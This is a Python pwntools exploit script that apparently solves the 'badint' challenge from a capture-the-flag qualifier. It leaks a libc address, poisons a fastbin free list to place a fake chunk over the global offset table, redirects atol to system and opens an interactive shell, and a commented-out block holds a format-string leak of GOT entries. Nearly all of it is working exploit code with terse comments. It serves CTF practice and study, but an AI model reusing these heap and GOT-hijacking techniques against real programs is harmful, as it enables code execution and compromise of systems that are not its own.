#!/usr/bin/env python


from pwn import *
import subprocess
import sys
import time

HOST = "badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me"
PORT = 21813
ELF_PATH = "./badint"
#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

LIBC_PATH = "./libc-2.19_15.so"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc-2.23.so"

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

context.terminal = ['tmux', 'splitw'] # for gdb.attach


elf = context.binary # context.binary is an ELF object

libc = ELF(LIBC_PATH)

def add_data(seq, off, data, lsf):
    r.sendlineafter("SEQ #:", str(seq))
    r.sendlineafter("Offset: ", str(off))
    r.sendlineafter("Data: ", data)
    r.sendlineafter("Yes/No: ", lsf)

def convert(num):
    ret = ""
    while num != 0:
        now = num & 0xff
        num >>= 8
        ret = ret + '{:02x}'.format(now)
    return ret.ljust(16, "0")

if __name__ == "__main__":
    
    #r = remote(HOST, PORT)
    r = process(ELF_PATH)

    
    add_data(1, 8, "1"*0x90*2, 'Yes')
    r.recvuntil("Assembled [seq: 1]: ")
    # leak libc address

    addr = 0
    for i in xrange(6):
        addr |= ((int(r.recv(2), 16)) << (i*8))
    
    log.success("addr: " +hex(addr))
    # libc.address = addr - 0x3c3b78 # local

    libc.address = addr - 0x3be7b8 # remote

    log.success("libc_base: " +hex(libc.address))
    # gdb.attach(r, gdbscript=open('./ggg', 'r'))

    # arrange heap

    add_data(2, 0, "2"*0xb0*2, 'Yes')
    add_data(2, 0, "3"*0x58*2, 'Yes')
    add_data(2, 0, "4"*0x38*2, 'Yes')
    # overwrite fastbin->fd ( in size 0x40 )

    payload = convert(0x41)
    payload += convert(0x604042)
    payload += convert(0) * 6
    payload += convert(0x31)
    payload = payload.ljust(0x58*2, '0')
    add_data(2, 0x60-0x8, payload, 'Yes')
    # now fastbin (size=0x40) has fake chunk @ got

    # allocate the fake chunk

    # overwrite got

    payload = "6"*12 # libc_start_main

    payload += convert(0x400b26) # resolve fgets

    payload += convert(0x400b36) # resolve strlen

    payload += convert(libc.symbols['system']) # hijack atol

    #payload += convert(elf.plt['printf']) # use format string to leak libc info

    payload = payload.ljust(110, '0')
    add_data(3, 8, payload, 'No')
    
    # hijack atol, send "sh" to get shell

    r.sendlineafter("SEQ #:", "sh")
    log.success("get shell!: ")
    r.interactive()

    # for exploiting format string & leak libc info

    """
    payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['fgets'])
    r.sendlineafter("SEQ #:", payload)
    r.recv(1)
    print "fgets:", hex(u64(r.recv(6).ljust(8, '\x00')))
    payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['puts'])
    r.sendlineafter("Offset:", payload)
    r.recv(1)
    print "puts:", hex(u64(r.recv(6).ljust(8, '\x00')))
    """
